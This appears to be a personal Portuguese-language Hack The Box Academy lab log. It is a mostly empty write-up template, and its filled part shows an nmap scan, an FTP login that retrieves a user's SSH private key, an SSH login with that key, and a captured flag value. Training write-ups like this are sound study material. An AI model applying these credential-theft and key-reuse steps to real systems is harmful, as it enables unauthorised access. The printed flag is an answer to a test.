# Footprinting Tests - Easy

!!! info "Sobre esta página"
    Use esta página para registrar cada máquina ativa explorada no Hack The Box, com foco em enumeração, exploração, escalonamento de privilégios e lições aprendidas.

## Informações gerais

- **Nome da máquina:**
- **IP:**
- **Sistema operacional:**
- **Dificuldade:**
- **Data de início:**
- **Data de conclusão:**
- **Status:** Finalizado
- **Objetivo principal:**
- **Tipo de máquina:**
- **Ambiente:**
- **Tags/Tecnologias:**
- **Credenciais fornecidas:**

## Enumeração inicial

- [ ] Nmap rápido executado
- [ ] Web fuzzing para descoberta de subdomínios
- [ ] Nmap completo executado
- [ ] Serviços identificados
- [ ] Aplicações web verificadas
- [ ] Diretórios/arquivos ocultos testados
- [ ] Versões e banners registrados
- [ ] Possíveis vulnerabilidades levantadas

## Resultados da enumeração

```shell
─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
└──╼ [★]$ sudo nmap -sS -sV -top-ports 1000 -T4 10.129.14.129
Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-01 15:11 EDT
Nmap scan report for 10.129.14.129
Host is up (0.0093s latency).
Not shown: 996 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
21/tcp   open  ftp?
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
53/tcp   open  domain  ISC BIND 9.16.1 (Ubuntu Linux)
2121/tcp open  ftp
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port21-TCP:V=7.95%I=7%D=6/1%Time=6A1DD950%P=x86_64-pc-linux-gnu%r(Gener
SF:icLines,9C,"220\x20ProFTPD\x20Server\x20\(ftp\.int\.inlanefreight\.htb\
SF:)\x20\[10\.129\.14\.129\]\r\n500\x20Invalid\x20command:\x20try\x20being
SF:\x20more\x20creative\r\n500\x20Invalid\x20command:\x20try\x20being\x20m
SF:ore\x20creative\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port2121-TCP:V=7.95%I=7%D=6/1%Time=6A1DD950%P=x86_64-pc-linux-gnu%r(Gen
SF:ericLines,8D,"220\x20ProFTPD\x20Server\x20\(Ceil's\x20FTP\)\x20\[10\.12
SF:9\.14\.129\]\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20c
SF:reative\r\n500\x20Invalid\x20command:\x20try\x20being\x20more\x20creati
SF:ve\r\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 157.98 seconds

### AQUI EU JA TENHO O ID_RSA QUE PEGUEI NO FTP 2121 DO CEIL ##
─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
└──╼ [★]$ chmod 600 id_rsa
┌─[us-academy-2]─[10.10.15.217]─[htb-ac-2219820@htb-zarjqkktbn]─[~]
└──╼ [★]$ ssh -i id_rsa ceil@10.129.14.129
Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-90-generic x86_64)

  System information as of Mon 01 Jun 2026 07:38:21 PM UTC

  System load:  0.0               Processes:               161
  Usage of /:   86.7% of 3.87GB   Users logged in:         0
  Memory usage: 12%               IPv4 address for ens192: 10.129.14.129
  Swap usage:   0%

Last login: Wed Nov 10 05:48:02 2021 from 10.10.14.20
ceil@NIXEASY:~$ ls -la
total 36
drwxr-xr-x 4 ceil ceil 4096 Nov 10  2021 .
drwxr-xr-x 5 root root 4096 Nov 10  2021 ..
-rw------- 1 ceil ceil  294 Nov 10  2021 .bash_history
-rw-r--r-- 1 ceil ceil  220 Nov 10  2021 .bash_logout
-rw-r--r-- 1 ceil ceil 3771 Nov 10  2021 .bashrc
drwx------ 2 ceil ceil 4096 Nov 10  2021 .cache
-rw-r--r-- 1 ceil ceil  807 Nov 10  2021 .profile
drwx------ 2 ceil ceil 4096 Nov 10  2021 .ssh
-rw------- 1 ceil ceil  759 Nov 10  2021 .viminfo
ceil@NIXEASY:~$ cd /home/flag/
ceil@NIXEASY:/home/flag$ cat flag.txt
HTB{7nrzise7hednrxihskjed7nzrgkweunj47zngrhdbkjhgdfbjkc7hgj}

## AQUI EH EU PEGANDO A ID_RSA DO FTP 2121 CEIL ##
──╼ [★]$ ftp ceil@10.129.14.129 2121
Connected to 10.129.14.129.
220 ProFTPD Server (Ceil's FTP) [10.129.14.129]
331 Password required for ceil
Password:
230 User ceil logged in
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd .ssh
250 CWD command successful
ftp> ls
229 Entering Extended Passive Mode (|||60808|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 ceil     ceil          738 Nov 10  2021 authorized_keys
-rw-------   1 ceil     ceil         3381 Nov 10  2021 id_rsa
-rw-r--r--   1 ceil     ceil          738 Nov 10  2021 id_rsa.pub
226 Transfer complete
ftp> get id_rsa
local: id_rsa remote: id_rsa
229 Entering Extended Passive Mode (|||62465|)
150 Opening BINARY mode data connection for id_rsa (3381 bytes)
100% |***********************************|  3381        2.86 MiB/s    00:00 ETA
226 Transfer complete
3381 bytes received in 00:00 (405.52 KiB/s)
ftp>
```

Portas abertas: 21 (ftp), 22 (ssh), 53 (dns) e 2121 (ftp? Ceil's FTP).

## Exploração inicial

- **Vetor escolhido:**
- **Falhas exploradas:**
- **Ferramentas usadas:**
- **Acesso inicial obtido como:**
- **Observações:**

```bash
# Comandos principais da exploração
smbclient -L //192.168.100.69 -N
```

## Shell e estabilização

- [ ] Reverse shell obtida
- [ ] Shell estabilizada
- [ ] Usuário identificado
- [ ] Ambiente validado

```bash
# Comandos para estabilização da shell
```

## Enumeração pós-exploração

- **Usuários encontrados:**
- **Arquivos sensíveis:**
- **Permissões incomuns:**
- **Serviços internos relevantes:**
- **Credenciais ou hashes localizados:**

```bash
# LinPEAS / LinEnum / enumeração manual
```

## Escalonamento de privilégios

- **Vetores identificados:**
- **Técnica utilizada:**
- **Resultado:**
- **Acesso root/administrator:**

```bash
# Comandos de privilege escalation
```

## Flags

- [ ] User flag capturada
- [ ] Root/Admin flag capturada
- **User flag:**
- **Root/Admin flag:**

## Evidências

- Adicione aqui prints, trechos de saída, links e observações importantes.

## Resumo técnico

- **Causa raiz da exploração:**
- **Cadeia de ataque resumida:**
- **Pontos que mais exigiram atenção:**

## Lições aprendidas

- **O que funcionou bem:**
- **O que atrasou a exploração:**
- **Comandos para revisar depois:**
- **Técnicas para estudar melhor:**

## Próximos passos

- [ ] Revisar exploração manual
- [ ] Reproduzir sem anotações
- [ ] Documentar writeup pessoal
- [ ] Relacionar técnicas com módulos CPTS
